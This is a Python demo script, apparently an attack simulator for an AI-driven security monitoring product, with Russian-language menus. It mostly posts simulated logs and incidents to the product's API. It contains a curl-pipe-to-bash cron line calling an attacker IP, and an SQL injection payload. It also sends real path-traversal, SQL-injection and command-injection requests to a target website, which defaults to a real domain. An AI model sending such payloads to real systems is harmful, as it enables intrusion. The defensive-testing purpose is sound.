import os
import sys
import json
import time
import urllib.request
import urllib.error

BASE_URL = ""
WEBSITE_URL = ""
ATTACKER_IP = "103.45.2.19"
HONEYPOT_IP = "185.122.90.11"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_color(text, color):
    colors = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'purple': '\033[95m',
        'cyan': '\033[96m',
        'end': '\033[0m'
    }
    if os.name == 'nt':
        os.system('') # Enable VT100 Escape Sequence for Windows
    print(f"{colors.get(color, '')}{text}{colors['end']}")

def print_header():
    clear_screen()
    print_color("="*75, "purple")
    print_color("      🔥 MISTRAL DEFENSE - ADVANCED ATTACK SIMULATOR v4.0 🔥      ", "red")
    print_color("="*75, "purple")
    print("  Этот симулятор предназначен для демонстрации возможностей платформы.")
    print("  Он генерирует события, логи, инциденты и метрики в реальном времени.")
    print("  Имитирует действия злоумышленника и отслеживает реакцию ИИ-агента.")
    print_color("="*75, "purple")
    print()

def api_request(path, data=None, method='POST'):
    url = BASE_URL + path
    req = urllib.request.Request(url, method=method)
    
    jsondata = None
    if data is not None:
        req.add_header('Content-Type', 'application/json')
        jsondata = json.dumps(data).encode('utf-8')
        
    try:
        if jsondata is not None:
            response = urllib.request.urlopen(req, data=jsondata)
        else:
            response = urllib.request.urlopen(req)
        return response.read().decode('utf-8')
    except urllib.error.URLError:
        return None

def website_request(path, method='GET', data=None):
    url = WEBSITE_URL + path
    req = urllib.request.Request(url, method=method)
    
    jsondata = None
    if data is not None:
        req.add_header('Content-Type', 'application/json')
        jsondata = json.dumps(data).encode('utf-8')
        
    try:
        if jsondata is not None:
            response = urllib.request.urlopen(req, data=jsondata, timeout=5)
        else:
            response = urllib.request.urlopen(req, timeout=5)
        return response.read().decode('utf-8'), response.status
    except urllib.error.HTTPError as e:
        try:
            return e.read().decode('utf-8'), e.code
        except:
            return None, e.code
    except Exception as e:
        return None, 500

def simulate_progress(task_name, duration_sec):
    print(f" [*] {task_name} ", end='', flush=True)
    steps = 15
    sleep_time = duration_sec / steps
    for _ in range(steps):
        time.sleep(sleep_time)
        print(".", end='', flush=True)
    print(" [DONE]")

def send_metric_spike(cpu, ram, disk, connections=142, ddos=None):
    payload = {
        'cpu': cpu,
        'ram': {'percent': ram, 'used_mb': int(ram * 163.84), 'total_mb': 16384},
        'disk': {'percent': disk, 'used_gb': int(disk * 2.4), 'total_gb': 240},
        'connections': connections,
        'monitor': 'system_anomaly_watcher',
        'hostname': 'demo-target-host',
        'timestamp': time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        'docker': {'healthy': True, 'count': 4, 'containers': []},
        'systemd': {'failed_count': 0, 'failed_units': []},
        'nginx': {'active': True}
    }
    if ddos:
        payload['ddos'] = ddos
    api_request('/api/metrics', payload)

def is_ip_quarantined(ip):
    res_str = api_request('/api/quarantine', method='GET')
    if not res_str:
        return False
    try:
        q_list = json.loads(res_str)
        return any(q.get('ip') == ip for q in q_list)
    except:
        return False

def check_ddos_blocked():
    res_str = api_request('/api/quarantine', method='GET')
    if not res_str:
        return False
    try:
        q_list = json.loads(res_str)
        return any(q.get('ip') == '82.102.0.0' or (q.get('ip') and q.get('ip').startswith('82.102.')) for q in q_list)
    except:
        return False

def wait_for_ai_mitigation(incident_id):
    print_color("\n [*] Ожидание реакции ИИ-Агента (Mistral SOAR)...", "yellow")
    print(" (Система опрашивает сервер на наличие отчета ИИ по этому инциденту...)")
    
    start_time = time.time()
    timeout = 45 # 45 seconds timeout
    while time.time() - start_time < timeout:
        time.sleep(1.5)
        res_str = api_request('/api/incidents', method='GET')
        if not res_str:
            continue
        try:
            res_json = json.loads(res_str)
            incidents_list = res_json.get('data', [])
            target_inc = next((inc for inc in incidents_list if inc['id'] == incident_id), None)
            if target_inc:
                status = target_inc.get('status', 'new')
                if status in ['resolved', 'advisory', 'ai_mitigation', 'ai_advisory']:
                    # Incident is being handled or handled. Let's see if aiAudit is populated
                    audit = target_inc.get('aiAudit')
                    if audit:
                        print_color("\n[🤖 РЕАКЦИЯ ИИ-АГЕНТА ОБНАРУЖЕНА!]", "green")
                        print_color(f"Статус защиты: {status.upper()}", "cyan")
                        print_color("-" * 75, "green")
                        print(audit)
                        print_color("-" * 75, "green")
                        return True
        except Exception as e:
            pass
    print_color(" [!] ИИ-Агент не ответил за отведенное время (возможно, ИИ выключен в настройках SOAR).", "yellow")
    return False

# ── SCENARIO 1 & 2: APT ATTACK ──────────────────────────────────────────
def run_apt_attack(step_by_step=False):
    print_header()
    print_color(f" [ MISTRAL APT ATTACK SIMULATION - {'ПОШАГОВЫЙ РЕЖИМ' if step_by_step else 'ЭКСПРЕСС-РЕЖИМ'} ]", "red")
    print(f" Target: {BASE_URL}")
    print(f" Attacker IP: {ATTACKER_IP}")
    print()

    # Check quarantine
    if is_ip_quarantined(ATTACKER_IP):
        print_color(f" [⚠️] Внимание: IP {ATTACKER_IP} уже в бане! Демонстрация может не сработать.", "yellow")
        print(" Рекомендуется сначала сбросить карантин (пункт [6] в меню).")
        if step_by_step:
            input(" Нажмите ENTER, чтобы продолжить все равно...")

    # PHASE 1
    print_color("\n=== [ФАЗА 1] СБОР ИНФОРМАЦИИ И СКАНИРОВАНИЕ ПОРТОВ (RECON) ===", "cyan")
    print("Описание: Атакующий запускает скрытое сканирование Nmap Stealth Scan для обнаружения открытых служб.")
    if step_by_step:
        input(" Нажмите ENTER, чтобы запустить Фазу 1...")
    simulate_progress(f"Сканирование сети с IP {ATTACKER_IP}", 2)
    for i in range(1, 4):
        api_request('/api/logs', {'type': 'server', 'level': 'warn', 'message': f'[Firewall] Port scan detected from {ATTACKER_IP} - port check {i}/3'})
        time.sleep(0.4)
    api_request('/api/incidents', {
        'severity': 'LOW', 'monitor': 'NetworkMonitor', 'type': 'PORT_SCAN',
        'description': f'Targeted port scan from {ATTACKER_IP}. Nmap SYN Stealth signature detected.'
    })
    print_color("  -> Инцидент PORT_SCAN зарегистрирован на сервере.", "green")
    
    # PHASE 2
    print_color("\n=== [ФАЗА 2] ПОПЫТКА СКОМПРОМЕТИРОВАТЬ SSH (BRUTE-FORCE) ===", "cyan")
    print("Описание: Атакующий осуществляет атаку перебора паролей (Brute-Force) на SSH-порт с помощью Hydra.")
    if step_by_step:
        input(" Нажмите ENTER, чтобы запустить Фазу 2...")
    simulate_progress("Выполнение Hydra SSH Brute-Force", 3)
    for i in range(1, 6):
        api_request('/api/logs', {'type': 'server', 'level': 'warn', 'message': f'[SSH] Failed password for root from {ATTACKER_IP} port 4833{i} ssh2'})
        time.sleep(0.3)
    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f'[SSH] Successful login for root from {ATTACKER_IP}'})
    api_request('/api/incidents', {
        'severity': 'HIGH', 'monitor': 'AuthMonitor', 'type': 'SSH_BRUTE_FORCE_SUCCESS',
        'description': f'Multiple failed SSH logins followed by a successful root session from {ATTACKER_IP}.'
    })
    print_color(f"  -> Инцидент SSH_BRUTE_FORCE_SUCCESS зарегистрирован. root на {ATTACKER_IP} скомпрометирован!", "red")

    # PHASE 3
    print_color("\n=== [ФАЗА 3] СКАНИРОВАНИЕ И ЭКСПЛУАТАЦИЯ WEB-УЯЗВИМОСТИ (SQLi) ===", "cyan")
    print("Описание: Атакующий эксплуатирует уязвимость внедрения SQL-кода (SQL Injection) в базу данных.")
    if step_by_step:
        input(" Нажмите ENTER, чтобы запустить Фазу 3...")
    simulate_progress("Обход WAF правил и внедрение SQL-полезной нагрузки", 3)
    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[WAF] Warning: Suspicious query payload from {ATTACKER_IP} matching rule SQLI_AUTH"})
    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': "[DB] SQL Syntax error near 'UNION SELECT NULL, password FROM users--'"})
    api_request('/api/incidents', {
        'severity': 'HIGH', 'monitor': 'WafMonitor', 'type': 'SQL_INJECTION',
        'description': f'Attacker {ATTACKER_IP} bypassed WAF rules and successfully executed SQL injection on /api/auth endpoint. Leak of user database suspected.'
    })
    print_color("  -> Инцидент SQL_INJECTION зарегистрирован.", "yellow")

    # PHASE 4
    print_color("\n=== [ФАЗА 4] ПОВЫШЕНИЕ ПРИВИЛЕГИЙ И ЗАКРЕПЛЕНИЕ (PRIVILEGE ESCALATION) ===", "cyan")
    print("Описание: Атакующий использует эксплоит ядра для повышения прав до root и закрепляет доступ в crontab.")
    if step_by_step:
        input(" Нажмите ENTER, чтобы запустить Фазу 4...")
    simulate_progress("Загрузка и компиляция эксплоита DirtyPipe", 3)
    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Audit] Unauthorized modification of /etc/shadow by UID=1002 from {ATTACKER_IP}"})
    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Cron] New cron entry: '* * * * * curl http://{ATTACKER_IP}/shell | bash'"})
    api_request('/api/incidents', {
        'severity': 'CRITICAL', 'monitor': 'IntegrityMonitor', 'type': 'PRIVILEGE_ESCALATION',
        'description': f'Kernel exploit executed from IP {ATTACKER_IP}. /etc/shadow modified. Malicious persistent cron job added.'
    })
    print_color("  -> Инцидент PRIVILEGE_ESCALATION зарегистрирован (Критический статус).", "red")

    # PHASE 5
    print_color("\n=== [ФАЗА 5] НАНЕСЕНИЕ УЩЕРБА И ШИФРОВАНИЕ ДАННЫХ (RANSOMWARE) ===", "cyan")
    print("Описание: Атакующий запускает шифровальщик. CPU сервера взлетает до 100%, файлы шифруются.")
    if step_by_step:
        input(" Нажмите ENTER, чтобы запустить Фазу 5...")
    print_color(" [!] Имитация скачка метрик сервера до 100%...", "yellow")
    send_metric_spike(100, 96, 99)
    simulate_progress("Массовое шифрование файлов в /var/www", 4)
    for i in range(1, 6):
        api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f'[Filemon] Mass encryption: /var/www/site_data_{i}.enc by attacker {ATTACKER_IP}'})
        time.sleep(0.3)
    
    inc_res = api_request('/api/incidents', {
        'severity': 'CRITICAL', 'monitor': 'SystemMonitor', 'type': 'RANSOMWARE_ENCRYPTION',
        'description': f'Massive file encryption in progress. Spiked CPU resources. IP: {ATTACKER_IP}. Ransom note dropped.'
    })
    print_color("  -> Инцидент RANSOMWARE_ENCRYPTION зарегистрирован. Сервер заблокирован.", "red")
    
    # Wait for AI report on this attack chain
    if inc_res:
        try:
            inc_id = json.loads(inc_res).get('incidentId')
            if inc_id:
                wait_for_ai_mitigation(inc_id)
        except Exception as e:
            print(f"Ошибка ожидания ответа ИИ: {e}")
            
    # Reset metrics
    time.sleep(1)
    send_metric_spike(12, 42, 28)

    print()
    print_color("="*75, "green")
    print_color(" [✅] ДЕМОНСТРАЦИОННЫЙ СЦЕНАРИЙ APT ЗАВЕРШЕН!", "green")
    print_color("="*75, "green")
    input("\n Нажмите ENTER для возврата в меню...")

# ── SCENARIO 3: HONEYPOT TRIGGER ─────────────────────────────────────────
def run_honeypot_demo():
    print_header()
    print_color(" [ СЦЕНАРИЙ: АТАКА НА ПРИМАНКУ (HONEYPOT DEMO) ]", "cyan")
    print(" Описание: Атакующий сканирует сеть, натыкается на фейковый платежный шлюз")
    print(" и пытается его взломать. Ханипот моментально триггерит критический алерт.")
    print(f" Simulated Attacker IP: {HONEYPOT_IP}")
    print()
    
    if is_ip_quarantined(HONEYPOT_IP):
        print_color(f" [⚠️] Внимание: IP {HONEYPOT_IP} уже забанен на сервере!", "yellow")
        print(" Рекомендуется сначала сбросить карантин (пункт [6] в меню).")
        
    input(" Нажмите ENTER для запуска симуляции...")

    simulate_progress("Сканирование открытых портов (Discovery)", 2)
    print_color(" [*] Обнаружен порт 8081 (Фейковый шлюз оплат)", "yellow")
    time.sleep(1)
    
    simulate_progress("Попытка эксплуатации платежного сервиса", 2)
    
    # Отправка лога с триггером ханипота
    api_request('/api/logs', {
        'type': 'server', 
        'level': 'warn', 
        'message': f'[Audit] USER=anonymous PID=8492 PWD=/var/www CMD=curl http://localhost:8081/remon_payment_gateway/exploit IP={HONEYPOT_IP}'
    })
    
    # Отправка инцидента
    inc_res = api_request('/api/incidents', {
        'severity': 'CRITICAL',
        'monitor': 'AuthMonitor-B',
        'type': 'HONEYPOT_TRIGGERED',
        'description': f'СРАБАТЫВАНИЕ ХАНИПОТА! Атакующий взаимодействует с фейковым контейнером remon_payment_gateway с IP {HONEYPOT_IP}.'
    })
    
    print_color("\n  -> [КРИТИЧЕСКИЙ] Инцидент HONEYPOT_TRIGGERED отправлен на сервер!", "red")
    print_color("  -> Запущен автономный протокол ИИ. Ожидайте автоблокировки в клиенте.", "yellow")
    
    if inc_res:
        try:
            inc_id = json.loads(inc_res).get('incidentId')
            if inc_id:
                wait_for_ai_mitigation(inc_id)
        except Exception as e:
            print(f"Ошибка ожидания ответа ИИ: {e}")
            
    # Проверка бана
    if is_ip_quarantined(HONEYPOT_IP):
        print_color(f"\n [✓] ПОДТВЕРЖДЕНО: IP {HONEYPOT_IP} внесен в карантин на сервере!", "green")
    else:
        print_color("\n [!] IP не заблокирован. Возможно, выключена опция автозащиты ИИ.", "yellow")
        
    input("\n Нажмите ENTER для возврата в меню...")

# ── SCENARIO 4: DDOS FLOOD ───────────────────────────────────────────────
def run_ddos_flood():
    print_header()
    print_color(" [ СЦЕНАРИЙ: DDOS FLOOD & НАГРУЗКА ИНТЕРФЕЙСА ]", "cyan")
    print(" Описание: Генерирует лавину логов сетевой активности, имитирует")
    print(" колоссальный скачок сетевых подключений и поднимает загрузку CPU до 100%.")
    print()
    input(" Нажмите ENTER для запуска флуда...")

    print_color(" [!] ЗАПУСК FLOOD-АТАКИ... СПАМ ЛОГОВ...", "red")
    print_color(" [*] Для отражения атаки добавьте 82.102.0.0 в карантин или включите ИИ-Автозащиту.", "yellow")
    print()
    
    # Send Incident
    inc_res = api_request('/api/incidents', {
        'severity': 'HIGH',
        'monitor': 'NetworkMonitor',
        'type': 'DDOS_FLOOD_ACTIVE',
        'description': 'Massive SYN-Flood / HTTP-Flood attack detected from botnet subnet 82.102.0.0/16. Ingress connections spiked.'
    })
    
    incident_id = None
    if inc_res:
        try:
            incident_id = json.loads(inc_res).get('incidentId')
        except:
            pass

    # Rapid logs and metric spikes
    conn_count = 100
    blocked = False
    max_steps = 80 # up to 40 seconds
    
    for i in range(1, max_steps + 1):
        conn_count += 120
        cpu_val = min(40 + i * 2, 98)
        ram_val = min(50 + int(i / 2), 92)
        
        ddos_data = {
            'syn_recv': conn_count - 50,
            'established': 100,
            'top_ips': [
                {'ip': '82.102.0.0', 'count': conn_count},
                {'ip': f'82.102.32.{i % 254}', 'count': int(conn_count / 3)}
            ]
        }
        
        send_metric_spike(cpu_val, ram_val, 88, connections=conn_count, ddos=ddos_data)
        
        api_request('/api/logs', {
            'type': 'server',
            'level': 'warn',
            'message': f'[Firewall] SYN FLOOD packet dropped: source=82.102.32.{i % 254} target=port_80'
        })
        
        print(f"\r  Отправлено {i*5} сетевых пакетов... Соединений: {conn_count} (CPU: {cpu_val}%)", end='', flush=True)
        
        # Check quarantine status every 2 steps (~1 second)
        if i % 2 == 0:
            if check_ddos_blocked():
                blocked = True
                break
                
        time.sleep(0.5)

    print()
    
    if blocked:
        print_color("\n [🛡️] ОБНАРУЖЕНО ИЗМЕНЕНИЕ ПРАВИЛ БРАНДМАУЭРА! (IP/Subnet 82.102.0.0/16 заблокирован в UFW)", "green")
        print_color("  -> Входящие пакеты от атакующей подсети успешно сбрасываются брандмауэром.", "green")
        print_color("  -> DDoS-атака успешно нейтрализована!", "green")
        if incident_id:
            wait_for_ai_mitigation(incident_id)
    else:
        print_color("\n [!] Время симуляции истекло. Атака не была заблокирована.", "red")
        print_color("  -> Сетевая активность на графиках клиента показывала резкий пик.", "green")
    
    time.sleep(2)
    print_color("\n [!] Стабилизация показателей метрик...", "blue")
    send_metric_spike(15, 45, 28, connections=90)
    
    input("\n Нажмите ENTER для возврата в меню...")

# ── SCENARIO 5: INTERACTIVE HACKER SANDBOX ────────────────────────────────
def run_interactive_sandbox():
    attacker_ip = "103.45.2.19"
    while True:
        print_header()
        print_color(" 🛡️ [ ИНТЕРАКТИВНАЯ ПЕСОЧНИЦА ХАКЕРА ] 🛡️", "purple")
        print(f" Целевой хост: {BASE_URL}")
        print(f" Ваш виртуальный IP-адрес: {attacker_ip}")
        
        # Check current quarantine status of this IP
        quarantined = is_ip_quarantined(attacker_ip)
        if quarantined:
            print_color(" СТАТУС ПОДКЛЮЧЕНИЯ: [❌ ЗАБЛОКИРОВАН В UFW (В КАРАНТИНЕ)]", "red")
        else:
            print_color(" СТАТУС ПОДКЛЮЧЕНИЯ: [🟢 АКТИВНО (АКУСТИКА ЧИСТАЯ)]", "green")
            
        print("\n Выберите действие:")
        print("  [1] Сканирование портов (Nmap SYN scan) [LOW RISK]")
        print("  [2] Перебор паролей SSH (Hydra Brute Force) [HIGH RISK]")
        print("  [3] Внедрение SQL-кода (SQL Injection) [HIGH RISK]")
        print("  [4] Повышение привилегий (Privilege Escalation) [CRITICAL RISK]")
        print("  [5] Запуск Ransomware (Критический риск) [CRITICAL RISK]")
        print("  [6] Запрос к платежному шлюзу-приманке (Honeypot) [INSTANT BAN]")
        print("  [7] Проверить отчет ИИ по последнему инциденту")
        print("  [8] Разблокировать мой IP на сервере")
        print("  [0] Назад в главное меню")
        print()
        
        choice = input(" Действие > ").strip()
        if choice == '0':
            break
            
        if quarantined and choice in ['1', '2', '3', '4', '5', '6']:
            print_color("\n [!] Ошибка: Вы заблокированы! Ваши сетевые пакеты сбрасываются брандмауэром сервера.", "red")
            print(" Используйте пункт [8] для разблокировки IP перед продолжением.")
            input("\n Нажмите ENTER...")
            continue
            
        if choice == '1':
            print_color("\n [*] Запуск Nmap Stealth Scan...", "yellow")
            simulate_progress("Сканирование портов", 1.5)
            api_request('/api/logs', {'type': 'server', 'level': 'warn', 'message': f'[Firewall] Port scan detected from {attacker_ip} on ports 22, 80, 443, 8080'})
            api_request('/api/incidents', {
                'severity': 'LOW', 'monitor': 'NetworkMonitor', 'type': 'PORT_SCAN',
                'description': f'Targeted port scan from {attacker_ip}. Nmap SYN Stealth signature detected.'
            })
            print_color("  [✓] Инцидент PORT_SCAN зарегистрирован на сервере.", "green")
            input("\n Нажмите ENTER...")
            
        elif choice == '2':
            print_color("\n [*] Запуск Hydra SSH Brute Force...", "yellow")
            simulate_progress("Подбор паролей SSH", 2)
            for i in range(1, 4):
                api_request('/api/logs', {'type': 'server', 'level': 'warn', 'message': f'[SSH] Failed password for root from {attacker_ip} port {5000+i}'})
                time.sleep(0.3)
            
            inc_res = api_request('/api/incidents', {
                'severity': 'HIGH', 'monitor': 'AuthMonitor', 'type': 'SSH_BRUTE_FORCE_SUCCESS',
                'description': f'Multiple failed SSH logins followed by a successful root session from {attacker_ip}.'
            })
            print_color("  [✓] Инцидент SSH_BRUTE_FORCE_SUCCESS зарегистрирован.", "red")
            
            if inc_res:
                try:
                    inc_id = json.loads(inc_res).get('incidentId')
                    if inc_id:
                        wait_for_ai_mitigation(inc_id)
                except:
                    pass
            input("\n Нажмите ENTER...")
            
        elif choice == '3':
            print_color("\n [*] Выполнение SQL-инъекции на /api/auth/login...", "yellow")
            simulate_progress("Обход WAF и SQLi", 2)
            api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[WAF] Warning: Suspicious query payload from {attacker_ip} matching rule SQLI_AUTH"})
            inc_res = api_request('/api/incidents', {
                'severity': 'HIGH', 'monitor': 'WafMonitor', 'type': 'SQL_INJECTION',
                'description': f'Attacker {attacker_ip} bypassed WAF rules and executed SQL injection. Potential database leak.'
            })
            print_color("  [✓] Инцидент SQL_INJECTION зарегистрирован.", "red")
            
            if inc_res:
                try:
                    inc_id = json.loads(inc_res).get('incidentId')
                    if inc_id:
                        wait_for_ai_mitigation(inc_id)
                except:
                    pass
            input("\n Нажмите ENTER...")
            
        elif choice == '4':
            print_color("\n [*] Запуск локального эксплоита для повышения привилегий...", "yellow")
            simulate_progress("DirtyPipe Exploit execution", 2.5)
            api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Audit] Unauthorized privilege escalation attempt by {attacker_ip}"})
            inc_res = api_request('/api/incidents', {
                'severity': 'CRITICAL', 'monitor': 'IntegrityMonitor', 'type': 'PRIVILEGE_ESCALATION',
                'description': f'Kernel exploit executed from IP {attacker_ip}. /etc/shadow modified.'
            })
            print_color("  [✓] Инцидент PRIVILEGE_ESCALATION зарегистрирован.", "red")
            
            if inc_res:
                try:
                    inc_id = json.loads(inc_res).get('incidentId')
                    if inc_id:
                        wait_for_ai_mitigation(inc_id)
                except:
                    pass
            input("\n Нажмите ENTER...")
            
        elif choice == '5':
            print_color("\n [*] Запуск Ransomware скрипта...", "yellow")
            send_metric_spike(100, 95, 99)
            simulate_progress("Шифрование файлов /var/www", 3)
            api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Filemon] Encryption anomaly detected on IP {attacker_ip}"})
            inc_res = api_request('/api/incidents', {
                'severity': 'CRITICAL', 'monitor': 'SystemMonitor', 'type': 'RANSOMWARE_ENCRYPTION',
                'description': f'Massive file encryption in progress by {attacker_ip}. Spiked CPU resources.'
            })
            print_color("  [✓] Инцидент RANSOMWARE_ENCRYPTION зарегистрирован.", "red")
            
            if inc_res:
                try:
                    inc_id = json.loads(inc_res).get('incidentId')
                    if inc_id:
                        wait_for_ai_mitigation(inc_id)
                except:
                    pass
            time.sleep(1)
            send_metric_spike(12, 42, 28)
            input("\n Нажмите ENTER...")
            
        elif choice == '6':
            print_color("\n [*] Попытка доступа к шлюзу remon_payment_gateway...", "yellow")
            simulate_progress("Взаимодействие с ханипотом", 2)
            api_request('/api/logs', {'type': 'server', 'level': 'warn', 'message': f'[Audit] CMD=curl http://localhost:8081/remon_payment_gateway/exploit IP={attacker_ip}'})
            inc_res = api_request('/api/incidents', {
                'severity': 'CRITICAL', 'monitor': 'AuthMonitor-B', 'type': 'HONEYPOT_TRIGGERED',
                'description': f'СРАБАТЫВАНИЕ ХАНИПОТА! Атакующий взаимодействует с фейковым контейнером remon_payment_gateway с IP {attacker_ip}.'
            })
            print_color("  [✓] Инцидент HONEYPOT_TRIGGERED зарегистрирован.", "red")
            
            if inc_res:
                try:
                    inc_id = json.loads(inc_res).get('incidentId')
                    if inc_id:
                        wait_for_ai_mitigation(inc_id)
                except:
                    pass
            input("\n Нажмите ENTER...")
            
        elif choice == '7':
            print_color("\n [*] Получение последнего инцидента на сервере...", "yellow")
            res_str = api_request('/api/incidents', method='GET')
            if res_str:
                try:
                    incidents_list = json.loads(res_str).get('data', [])
                    if incidents_list:
                        latest = incidents_list[0]
                        print(f" Последний инцидент: {latest.get('type')} (ID: {latest.get('id')})")
                        print(f" Статус: {latest.get('status')} | Уровень: {latest.get('severity')}")
                        audit = latest.get('aiAudit')
                        if audit:
                            print_color("\n[Отчет ИИ-Агента]:", "green")
                            print(audit)
                        else:
                            print(" Отчет ИИ отсутствует для этого инцидента.")
                    else:
                        print(" Инциденты не найдены.")
                except Exception as e:
                    print(f" Ошибка парсинга: {e}")
            else:
                print(" Не удалось получить инциденты.")
            input("\n Нажмите ENTER...")
            
        elif choice == '8':
            api_request(f'/api/quarantine/{attacker_ip}', method='DELETE')
            print_color(f"\n [✓] Ваш IP {attacker_ip} успешно разблокирован на сервере!", "green")
            time.sleep(1.5)

def run_complex_attack():
    print_header()
    print_color(" ⚡️ [ КОМПЛЕКСНАЯ СИМУЛЯЦИЯ АТАКИ НА RAEMON.RU ] ⚡️", "red")
    print(f" Mistral Server: {BASE_URL}")
    print(f" Target Website: {WEBSITE_URL}")
    print(" Описание: Имитирует одновременную многовекторную атаку непосредственно на")
    print(" защищаемый веб-ресурс и платежный ханипот. Проверяет блокировку на сайте.")
    print()
    
    input(" Нажмите ENTER, чтобы запустить комплексную атаку...")

    # Phase 1: Scan / Path Traversal
    print_color("\n [*] Шаг 1: Сканирование сайта и попытки Path Traversal...", "yellow")
    website_request("/api/static/../../etc/passwd")
    time.sleep(0.5)

    # Phase 2: SQL Injection & Command Injection on Website
    print_color(" [*] Шаг 2: Эксплуатация SQLi и Command Injection на веб-сервере...", "yellow")
    website_request("/api/auth/login?username=admin%27%20OR%201=1--")
    website_request("/api/admin/debug?cmd=whoami")
    time.sleep(0.5)

    # Phase 3: Honeypot Trigger
    try:
        from urllib.parse import urlparse
        parsed = urlparse(BASE_URL)
        server_host = parsed.hostname or "localhost"
    except:
        server_host = "localhost"
        
    print_color(f" [*] Шаг 3: Обращение к платежному ханипоту на {server_host}:8081...", "yellow")
    try:
        urllib.request.urlopen(f"http://{server_host}:8081/remon_payment_gateway/exploit", timeout=3)
    except:
        pass
    time.sleep(1)

    # Phase 4: DDoS Burst to Website
    print_color(" [*] Шаг 4: Сетевой флуд (DDoS) запросов для перегрузки WAF...", "yellow")
    for i in range(15):
        website_request(f"/?noise={i}")
    time.sleep(1)

    print_color("\n [!] Атака завершена. Проверяем реакцию MISTRAL...", "yellow")
    print(" Ожидание синхронизации списков блокировки (4 сек)...")
    time.sleep(4.5)

    print_color("\n [*] Отправка проверочного запроса на сайт...", "cyan")
    res_text, status_code = website_request("/api/apartments")
    
    if status_code == 403:
        print_color("\n [🛡️] УСПЕШНО: WAF-агент заблокировал наш запрос на сайт!", "green")
        print_color(f"  -> Ответ сайта: {status_code} Forbidden", "green")
        if res_text:
            print_color(f"  -> Тело ответа WAF: {res_text}", "cyan")
        print_color("  -> Агент пресек атаку на сайт, трафик злоумышленника полностью заблокирован!", "green")
    else:
        print_color(f"\n [⚠️] Проверочный запрос прошел со статусом {status_code}.", "yellow")
        print_color("  -> Проверьте, включена ли опция автозащиты ИИ и авто-бан в настройках SOAR.", "yellow")
        
    input("\n Нажмите ENTER для возврата в меню...")

# ── RESET QUARANTINE FUNCTION ───────────────────────────────────────────
def clear_all_quarantine():
    print_color("\n [*] Запрос списка заблокированных IP...", "yellow")
    res_str = api_request('/api/quarantine', method='GET')
    if not res_str:
        print_color(" [!] Не удалось получить список карантина.", "red")
        time.sleep(1.5)
        return
    try:
        q_list = json.loads(res_str)
        if not q_list:
            print_color(" [✓] Карантин пуст, разблокировка не требуется.", "green")
            time.sleep(1.5)
            return
        
        print_color(f" [*] Найдено {len(q_list)} заблокированных IP. Разблокировка...", "yellow")
        for q in q_list:
            ip = q.get('ip')
            if ip:
                api_request(f'/api/quarantine/{ip}', method='DELETE')
                print(f"  [+] IP {ip} разблокирован.")
        print_color(" [✓] Все IP-адреса успешно разблокированы!", "green")
    except Exception as e:
        print_color(f" [!] Ошибка при разблокировке: {e}", "red")
    time.sleep(1.5)

# ── MAIN MENU ────────────────────────────────────────────────────────────
def main():
    global BASE_URL, WEBSITE_URL
    print_header()
    
    target = input(" Введите адрес Mistral Server (например, http://localhost:8080 или нажмите ENTER):\n > ").strip()
    if not target:
        target = "http://localhost:8080"
    if not target.startswith("http"):
        target = "http://" + target
    BASE_URL = target.rstrip('/')
    
    web_target = input(" Введите адрес защищаемого сайта Remon (например, https://raemon.ru или нажмите ENTER):\n > ").strip()
    if not web_target:
        web_target = "https://raemon.ru"
    if not web_target.startswith("http"):
        web_target = "http://" + web_target
    WEBSITE_URL = web_target.rstrip('/')
 
    while True:
        print_header()
        print(f" Подключено к серверу: {BASE_URL}")
        print(f" Защищаемый веб-сайт:  {WEBSITE_URL}")
        print(" Выберите демонстрационный сценарий:")
        print()
        print_color("  [1] Комплексная атака на raemon.ru (Все фазы одновременно)", "red")
        print_color("  [2] Экспресс-презентация (Быстрый прогон APT-атаки)", "green")
        print_color("  [3] Пошаговая APT-атака (по фазам с паузами)", "yellow")
        print_color("  [4] Срабатывание Ханипота (Атака на приманку шлюза платежей)", "cyan")
        print_color("  [5] DDoS-нагрузка (Лавина сетевых логов и скачок графиков)", "purple")
        print_color("  [6] Интерактивная песочница хакера (Ручное управление атакой)", "blue")
        print_color("  [7] Сбросить карантин (Разблокировать все IP-адреса)", "red")
        print("  [0] Выход")
        print()
        
        choice = input(" Введите номер сценария > ").strip()
        
        if choice == '1':
            run_complex_attack()
        elif choice == '2':
            run_apt_attack(step_by_step=False)
        elif choice == '3':
            run_apt_attack(step_by_step=True)
        elif choice == '4':
            run_honeypot_demo()
        elif choice == '5':
            run_ddos_flood()
        elif choice == '6':
            run_interactive_sandbox()
        elif choice == '7':
            clear_all_quarantine()
        elif choice == '0':
            print("\n Выход из симулятора.")
            break
        else:
            print_color(" Неверный выбор. Пожалуйста, введите 0-7.", "red")
            time.sleep(1.5)

if __name__ == '__main__':
    main()
